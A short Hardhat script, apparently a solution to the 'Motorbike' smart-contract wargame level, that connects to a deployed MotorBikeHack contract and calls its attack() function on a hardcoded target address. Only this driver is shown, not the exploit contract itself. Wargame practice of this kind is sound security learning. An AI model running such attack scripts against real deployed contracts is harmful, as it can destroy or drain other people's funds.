const hre = require("hardhat");
const hackABI = require("../artifacts/contracts/MotorBikeHack.sol/MotorBikeHack.json").abi;

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 
    
    const hackAddress = "0x58F887F5D738fA2787b9147445d7e54Ac73B1C5f"
    const hackContract = new hre.ethers.Contract(hackAddress, hackABI, deployer);

    const result = await hackContract.attack('0x01cee715b6e19267b77d32c1e766de68a74fdb55');
    await result.wait();

    console.log("Attack executed, transaction hash:", result.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });